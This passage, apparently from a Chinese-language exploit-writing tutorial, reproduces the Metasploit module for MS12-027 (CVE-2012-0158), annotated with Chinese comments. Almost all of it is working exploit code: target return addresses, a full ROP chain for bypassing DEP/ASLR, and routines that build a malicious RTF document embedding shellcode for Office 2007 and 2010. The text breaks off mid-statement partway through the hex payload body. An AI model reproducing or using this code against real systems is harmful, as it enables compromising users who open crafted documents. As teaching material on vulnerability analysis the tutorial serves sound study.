<h2 id="Metasploit漏洞利用脚本">Metasploit漏洞利用脚本</h2><p>分析完漏洞原因就可以写漏洞利用程序了，最简单的方式就是利用msf生成可以各种配置，简单方便。找到这个漏洞的rb脚本，一般所有的利用脚本都在/opt/metasploit-framework/modules/exploits/，具体路径就是之前显示的那个exploit/windows/fileformat/ms12_027_mscomctl_bof.rb。<br>代码如下<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br></pre></td><td class="code"><pre><span class="line">##</span><br><span class="line"># This file is part of the Metasploit Framework and may be subject to</span><br><span class="line"># redistribution and commercial restrictions. Please see the Metasploit</span><br><span class="line"># web site for more information on licensing and terms of use.</span><br><span class="line">#   http://metasploit.com/</span><br><span class="line">##</span><br><span class="line">#需要的类库</span><br><span class="line">require 'msf/core'</span><br><span class="line"> </span><br><span class="line"> #&lt;  表示继承</span><br><span class="line">class Metasploit3 &lt; Msf::Exploit::Remote</span><br><span class="line">    Rank = AverageRanking</span><br><span class="line"> </span><br><span class="line">    include Msf::Exploit::FILEFORMAT</span><br><span class="line">    </span><br><span class="line">	#定义模块初始化信息，如漏洞适用的操作系统平台、为不同操作系	</span><br><span class="line">	#统指明不同的返回地址、指明 shellcode 中禁止出现的特殊字符、</span><br><span class="line">	#漏洞相关的描述、URL 引用、作者信息等</span><br><span class="line">    def initialize(info = &#123;&#125;)</span><br><span class="line">        super(update_info(info,</span><br><span class="line">            'Name'           =&gt; 'MS12-027 MSCOMCTL ActiveX Buffer Overflow',</span><br><span class="line">            'Description'    =&gt; %q&#123;</span><br><span class="line">                    This module exploits a stack buffer overflow in MSCOMCTL.OCX. It uses a malicious</span><br><span class="line">                RTF to embed the specially crafted MSComctlLib.ListViewCtrl.2 Control as exploited</span><br><span class="line">                in the wild on April 2012.</span><br><span class="line"> </span><br><span class="line">                This module targets Office 2007 and Office 2010 targets. The DEP/ASLR bypass on Office</span><br><span class="line">                2010 is done with the Ikazuchi ROP chain proposed by Abysssec. This chain uses</span><br><span class="line">                "msgr3en.dll", which will load after office got load, so the malicious file must</span><br><span class="line">                be loaded through "File / Open" to achieve exploitation.</span><br><span class="line">            &#125;,</span><br><span class="line">            'License'        =&gt; MSF_LICENSE,</span><br><span class="line">            'Author'         =&gt;</span><br><span class="line">                [</span><br><span class="line">                    'Unknown', # Vulnerability discovery</span><br><span class="line">                    'juan vazquez', # Metasploit module</span><br><span class="line">                    'sinn3r' # Metasploit module</span><br><span class="line">                ],</span><br><span class="line">            'References'     =&gt;</span><br><span class="line">                [</span><br><span class="line">                    [ 'CVE', '2012-0158' ],</span><br><span class="line">                    [ 'OSVDB', '81125' ],</span><br><span class="line">                    [ 'BID', '52911' ],</span><br><span class="line">                    [ 'MSB', 'MS12-027' ],</span><br><span class="line">                    [ 'URL', 'http://contagiodump.blogspot.com.es/2012/04/cve2012-0158-south-china-sea-insider.html' ],</span><br><span class="line">                    [ 'URL', 'http://abysssec.com/files/The_Arashi.pdf' ]</span><br><span class="line">                ],</span><br><span class="line">            'DefaultOptions' =&gt;</span><br><span class="line">                &#123;</span><br><span class="line">                    'EXITFUNC' =&gt; 'process',</span><br><span class="line">                &#125;,</span><br><span class="line">            'Payload'        =&gt;</span><br><span class="line">                &#123;</span><br><span class="line">                    'PrependEncoder' =&gt; "\x81\xc4\x54\xf2\xff\xff", # Stack adjustment # add esp, -3500,</span><br><span class="line">                    'Space'         =&gt; 900,</span><br><span class="line">                    'BadChars'      =&gt; "\x00",</span><br><span class="line">                    'DisableNops'   =&gt; true # no need</span><br><span class="line">                &#125;,</span><br><span class="line">            'Platform'       =&gt; 'win',</span><br><span class="line">            'Targets'        =&gt;</span><br><span class="line">                [</span><br><span class="line">                    # winword.exe v12.0.4518.1014 (No Service Pack)</span><br><span class="line">                    # winword.exe v12.0.6211.1000 (SP1)</span><br><span class="line">                    # winword.exe v12.0.6425.1000 (SP2)</span><br><span class="line">                    # winword.exe v12.0.6612.1000 (SP3)</span><br><span class="line">                    [ 'Microsoft Office 2007 [no-SP/SP1/SP2/SP3] English on Windows [XP SP3 / 7 SP1] English',</span><br><span class="line">                        &#123;</span><br><span class="line">                            'Offset' =&gt; 270,</span><br><span class="line">                            'Ret' =&gt; 0x27583c30, # jmp esp # MSCOMCTL.ocx 6.1.95.45     跳板指令地址    </span><br><span class="line">                            'Rop' =&gt; false</span><br><span class="line">                        &#125;</span><br><span class="line">                    ],</span><br><span class="line">                    # winword.exe v14.0.6024.1000 (SP1)</span><br><span class="line">                    [ 'Microsoft Office 2010 SP1 English on Windows [XP SP3 / 7 SP1] English',</span><br><span class="line">                        &#123;</span><br><span class="line">                            'Ret' =&gt; 0x3F2CB9E1, # ret # msgr3en.dll</span><br><span class="line">                            'Rop' =&gt; true,</span><br><span class="line">                            'RopOffset' =&gt; 120</span><br><span class="line">                        &#125;</span><br><span class="line">                    ],</span><br><span class="line">                ],</span><br><span class="line">            'DisclosureDate' =&gt; 'Apr 10 2012',</span><br><span class="line">            'DefaultTarget' =&gt; 0))</span><br><span class="line"> </span><br><span class="line">        register_options(</span><br><span class="line">            [</span><br><span class="line">                OptString.new('FILENAME', [ true, 'The file name.',  'msf.doc']),</span><br><span class="line">            ], self.class)</span><br><span class="line">    end</span><br><span class="line"> </span><br><span class="line">    def stream(bytes)</span><br><span class="line">        Rex::Text.to_hex(bytes).gsub("\\x", "")</span><br><span class="line">    end</span><br><span class="line"> </span><br><span class="line">    def junk(n=1)</span><br><span class="line">        tmp = []</span><br><span class="line">        value = rand_text(4).unpack("L")[0].to_i</span><br><span class="line">        n.times &#123; tmp &lt;&lt; value &#125;</span><br><span class="line">        return tmp</span><br><span class="line">    end</span><br><span class="line"> </span><br><span class="line">    # Ikazuchi ROP chain (msgr3en.dll)</span><br><span class="line">    # Credits to Abysssec</span><br><span class="line">    # http://abysssec.com/files/The_Arashi.pdf</span><br><span class="line">    def create_rop_chain</span><br><span class="line">        rop_gadgets = [</span><br><span class="line">            0x3F2CB9E0, # POP ECX # RETN</span><br><span class="line">            0x3F10115C, # HeapCreate() IAT = 3F10115C</span><br><span class="line">            # EAX == HeapCreate() Address</span><br><span class="line">            0x3F389CA5, # MOV EAX,DWORD PTR DS:[ECX] # RETN</span><br><span class="line">            # Call HeapCreate() and Create a Executable Heap. After this call, EAX contain our Heap Address.</span><br><span class="line">            0x3F39AFCF, # CALL EAX # RETN</span><br><span class="line">            0x00040000,</span><br><span class="line">            0x00010000,</span><br><span class="line">            0x00000000,</span><br><span class="line">            0x3F2CB9E0, # POP ECX # RETN</span><br><span class="line">            0x00008000, # pop 0x00008000 into ECX</span><br><span class="line">            # add ECX to EAX and instead of calling HeapAlloc, now EAX point to the RWX Heap</span><br><span class="line">            0x3F39CB46, # ADD EAX,ECX # POP ESI # RETN</span><br><span class="line">            junk,</span><br><span class="line">            0x3F2CB9E0, # POP ECX # RETN</span><br><span class="line">            0x3F3B3DC0, # pop 0x3F3B3DC0 into ECX, it is a writable address.</span><br><span class="line">            # storing our RWX Heap Address into 0x3F3B3DC0 ( ECX ) for further use ;)</span><br><span class="line">            0x3F2233CC, # MOV DWORD PTR DS:[ECX],EAX # RETN</span><br><span class="line">            0x3F2D59DF, #POP EAX # ADD DWORD PTR DS:[EAX],ESP # RETN</span><br><span class="line">            0x3F3B3DC4, # pop 0x3F3B3DC4 into EAX , it is writable address with zero!</span><br><span class="line">                                    # then we add ESP to the Zero which result in storing ESP into that address,</span><br><span class="line">                                    # we need ESP address for copying shellcode ( which stores in Stack ),</span><br><span class="line">                                    # and we have to get it dynamically at run-time, now with my tricky instruction, we have it!</span><br><span class="line">            0x3F2F18CC, # POP EAX # RETN</span><br><span class="line">            0x3F3B3DC4, # pop 0x3F3B3DC4 ( ESP address ) into EAX</span><br><span class="line">            # makes ECX point to nearly offset of Stack.</span><br><span class="line">            0x3F2B745E, # MOV ECX,DWORD PTR DS:[EAX] #RETN</span><br><span class="line">            0x3F39795E, # POP EDX # RETN</span><br><span class="line">            0x00000024, # pop 0x00000024 into EDX</span><br><span class="line">            # add 0x24 to ECX ( Stack address )</span><br><span class="line">            0x3F39CB44, # ADD ECX,EDX # ADD EAX,ECX # POP ESI # RETN</span><br><span class="line">            junk,</span><br><span class="line">            # EAX = ECX</span><br><span class="line">            0x3F398267, # MOV EAX,ECX # RETN</span><br><span class="line">            # mov EAX ( Stack Address + 24 = Current ESP value ) into the current Stack Location,</span><br><span class="line">            # and the popping it into ESI ! now ESI point where shellcode stores in stack</span><br><span class="line">            0x3F3A16DE, # MOV DWORD PTR DS:[ECX],EAX # XOR EAX,EAX # POP ESI # RETN</span><br><span class="line">            # EAX = ECX</span><br><span class="line">            0x3F398267, # MOV EAX,ECX # RETN</span><br><span class="line">            0x3F2CB9E0, # POP ECX # RETN</span><br><span class="line">            0x3F3B3DC0, # pop 0x3F3B3DC0 ( Saved Heap address ) into ECX</span><br><span class="line">            # makes EAX point to our RWX Heap</span><br><span class="line">            0x3F389CA5, # MOV EAX,DWORD PTR DS:[ECX] # RETN</span><br><span class="line">            # makes EDI = Our RWX Heap Address</span><br><span class="line">            0x3F2B0A7C, # XCHG EAX,EDI # RETN 4</span><br><span class="line">            0x3F2CB9E0, # POP ECX # RETN</span><br><span class="line">            junk,</span><br><span class="line">            0x3F3B3DC0, # pop 0x3F3B3DC0 ( Saved Heap address ) into ECX</span><br><span class="line">            # makes EAX point to our RWX Heap</span><br><span class="line">            0x3F389CA5, # MOV EAX,DWORD PTR DS:[ECX] # RETN</span><br><span class="line">            # just skip some junks</span><br><span class="line">            0x3F38BEFB, # ADD AL,58 # RETN</span><br><span class="line">            0x3F2CB9E0, # POP ECX # RETN</span><br><span class="line">            0x00000300, # pop 0x00000300 into ECX ( 0x300 * 4 = Copy lent )</span><br><span class="line">            # Copy shellcode from stack into RWX Heap</span><br><span class="line">            0x3F3441B4, # REP MOVS DWORD PTR ES:[EDI],DWORD PTR DS:[ESI] # POP EDI # POP ESI # RETN</span><br><span class="line">            junk(2), # pop into edi # pop into esi</span><br><span class="line">            0x3F39AFCF # CALL EAX # RETN</span><br><span class="line">        ].flatten.pack("V*")</span><br><span class="line"> </span><br><span class="line">        # To avoid shellcode being corrupted in the stack before ret</span><br><span class="line">        rop_gadgets &lt;&lt; "\x90" * target['RopOffset'] # make_nops doesn't have sense here</span><br><span class="line">        return rop_gadgets</span><br><span class="line"> </span><br><span class="line">    end</span><br><span class="line"> </span><br><span class="line">	#将填充物、返回地址、shellcode 等组织成最终的 attack_buffer，并</span><br><span class="line">	#发送</span><br><span class="line">    def exploit</span><br><span class="line">        #返回地址</span><br><span class="line">        ret_address = stream([target.ret].pack("V"))</span><br><span class="line"> </span><br><span class="line">        #对shellcode处理</span><br><span class="line">        if target['Rop']</span><br><span class="line">            shellcode = stream(create_rop_chain)</span><br><span class="line">        else</span><br><span class="line">            # To avoid shellcode being corrupted in the stack before ret</span><br><span class="line">            shellcode = stream(make_nops(target['Offset']))</span><br><span class="line">            shellcode &lt;&lt; stream(Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $+6").encode_string)</span><br><span class="line">            shellcode &lt;&lt; stream(make_nops(4))</span><br><span class="line">        end</span><br><span class="line">        shellcode &lt;&lt; stream(payload.encoded)</span><br><span class="line">        while shellcode.length &lt; 2378</span><br><span class="line">            shellcode += "0"</span><br><span class="line">        end</span><br><span class="line"> </span><br><span class="line">        content = "&#123;\\rtf1"</span><br><span class="line">        content &lt;&lt; "&#123;\\fonttbl&#123;\\f0\\fnil\\fcharset0 Verdana;&#125;&#125;"</span><br><span class="line">        content &lt;&lt; "\\viewkind4\\uc1\\pard\\sb100\\sa100\\lang9\\f0\\fs22\\par"</span><br><span class="line">        content &lt;&lt; "\\pard\\sa200\\sl276\\slmult1\\lang9\\fs22\\par"</span><br><span class="line">        content &lt;&lt; "&#123;\\object\\objocx"</span><br><span class="line">        content &lt;&lt; "&#123;\\*\\objdata"</span><br><span class="line">        content &lt;&lt; "\n"</span><br><span class="line">        content &lt;&lt; "01050000020000001B0000004D53436F6D63746C4C69622E4C697374566965774374726C2E320000"</span><br><span class="line">        content &lt;&lt; "00000000000000000E0000"</span><br><span class="line">        content &lt;&lt; "\n"</span><br><span class="line">        content &lt;&lt; "D0CF11E0A1B11AE1000000000000000000000000000000003E000300FEFF09000600000000000000"</span><br><span class="line">        content &lt;&lt; "00000000010000000100000000000000001000000200000001000000FEFFFFFF0000000000000000"</span><br><span class="line">        content &lt;&lt; "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"</span><br><span class="line">        content &lt;&lt; "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"</span><br><span class="line">        content &lt;&lt; "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"</span><br><span class="line">        content &lt;&lt; "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"</span><br><span class="line">        content &lt;&lt; "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"</span><br><span class="line">        content &lt;&lt; "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"</span><br><span class="line">        content &lt;&lt; "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"</span><br><span class="line">        content &lt;&lt; "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"</span><br><span class="line">        content &lt;&lt; "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"</span><br><span class="line">        content &lt;&lt; "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"</span><br><span class="line">        content &lt;&lt; "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFDFFFFFFFEFFFFFF"</span><br><span class="line">        content &lt;&lt; "FEFFFFFF0400000005000000FEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"</span><br><span class="line">        content &lt;&lt; "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"</span><br><span class="line">        content &lt;&lt; "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"</span><br><span class="line">        content &lt;&lt; "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"</span><br><span class="line">        content &lt;&lt; "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"</span><br><span class="line">        content &lt;&lt; "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"</span><br><span class="line">        content &lt;&lt; "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"</span><br><span class="line">        content &lt;&lt; "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"</span><br><span class="line">        content &lt;&lt; "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"</span><br><span class="line">        content &lt;&lt; "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"</span><br><span class="line">        content &lt;&lt; "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"</span><br><span class="line">        content &lt;&lt; "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"</span><br><span class="line">        content &lt;&lt; "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF52006F006F007400200045006E007400"</span><br><span class="line">        content &lt;&lt; "72007900000000000000000000000000000000000000000000000000000000000000000000000000"</span><br><span class="line">        content &lt;&lt; "000000000000000016000500FFFFFFFFFFFFFFFF020000004BF0D1BD8B85D111B16A00C0F0283628"</span><br><span class="line">        content &lt;&lt; "0000000062eaDFB9340DCD014559DFB9340DCD0103000000000600000000000003004F0062006A00"</span><br><span class="line">        content &lt;&lt; "49006E0066006F000000000000000000000000000000000000000000000000000000000000000000"</span><br><span class="line">        content &lt;&lt; "0000000000000000000000000000000012000200FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000"</span><br><span class="line">        content &lt;&lt; "00000000000000000000000000000000000000000000000000000000000000000600000000000000"</span><br><span class="line">        content &lt;&lt; "03004F00430058004E0041004D004500000000000000000000000000000000000000000000000000"</span><br><span class="line">        content &lt;&lt; "000000000000000000000000000000000000000000000000120002010100000003000000FFFFFFFF"</span><br><span class="line">        content &lt;&lt; "00000000000000000000000000000000000000000000000000000000000000000000000001000000"</span><br><span class="line">        content &lt;&lt; "160000000000000043006F006E00740065006E007400730000000000000000000000000000000000"</span><br><span class="line">        content &lt;&lt; "000000000000000000000000000000000000000000000000000000000000000012000200FFFFFFFF"</span><br><span class="line">        content &lt;&lt; "FFFFFFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000"</span><br><span class="line">        content &lt;&lt; "00000000020000007E05000000000000FEFFFFFFFEFFFFFF03000000040000000500000006000000"</span><br><span class="line">        content &lt;&lt; "0700000008000000090000000A0000000B0000000C0000000D0000000E0000000F00000010000000"</span><br><span class="line">        content &lt;&lt; "11000000120000001300000014000000150000001600000017000000FEFFFFFFFFFFFFFFFFFFFFFF"</span><br><span class="line">        content &lt;&lt; "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"</span><br><span class="line">        content &lt;&lt; "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"</span><br><span class="line">        content &lt;&lt; "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"</span><br><span class="line">        content &lt;&lt; "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"</span><br><span class="line">        content &lt;&lt; "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"</span><br><span class="line">        content &lt;&lt; "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"</span><br><span class="line">        content &lt;&lt; "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"</span><br><span class="line">        content &lt;&lt; "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"</span><br><span class="line">        content &lt;&lt; "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"</span><br><span class="line">        content &lt;&lt; "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"</span><br><span class="line">        content &lt;&lt; "FFFFFFFFFFFFFFFF0092030004000000000000000000000000000000000000000000000000000000"</span><br><span class="line">        content &lt;&lt; "00000000000000000000000000000000000000000000000000000000000000004C00690073007400"</span><br><span class="line">        content &lt;&lt; "56006900650077004100000000000000000000000000000000000000000000000000000000000000"</span><br><span class="line">        content &lt;&lt; "0000000000000000000000000000000021433412080000006ab0822cbb0500004E087DEB01000600"</span><br><span class="line">        content &lt;&lt; "1C000000000000000000000000060001560A000001EFCDAB00000500985D65010700000008000080"</span><br><span class="line">        content &lt;&lt; "05000080000000000000000000000000000000001FDEECBD01000500901719000000080000004974"</span><br><span class="line">        content &lt;&lt; "6D736400000002000000010000000C000000436F626A640000008282000082820000000000000000"</span><br><span class="line">        content &lt;&lt; "000000000000"</span><br><span class="line">        content &lt;&lt; ret_address                        #这里就是 跳板指令  0x27583c30</span><br><span class="line">        content &lt;&lt; "9090909090909090"</span><br><span class="line">        content &lt;&lt; shellcode                            #这里是要执行的shellcode 根据你的选择添加</span><br><span class="line">        content &lt;&lt; "00000000000000000000000000000000000000000000000000000000000000000000000000000000"</span><br><span class="line">        content &lt;&lt; "00000000000000000000000000000000000000000000000000000000000000000000000000000000"</span><br><span class="line">        content &lt;&lt; "00000000000000000000000000000000000000000000000000000000000000000000000000000000"</span><br><span class="line">        content &lt;&lt; "00000000000000000000000000000000000000000000000000000000000000000000000000000000"</span><br><span class="line">        content &lt;&lt; "00000000000000000000000000000000000000000000000000000000000000000000000000000000"</span><br><span class="line">        content &lt;&lt; "00000000000000000000000000000000000000000000000000000000000000000000000000000000"</span><br><span class="line">        content &lt;&lt; "00000000000000000000000000000000000000000000000000000000000000000000000000000000"</span><br><span class="line">        content &lt;&lt; "00000000000000000000000000000000000000000000000000000000000000000000000000000000"</span><br><span class="line">        content &lt;&lt; "00000000000000000000000000000000000000000000000000000000000000000000000000000000"</span><br><span class="line">        content &lt;&lt; 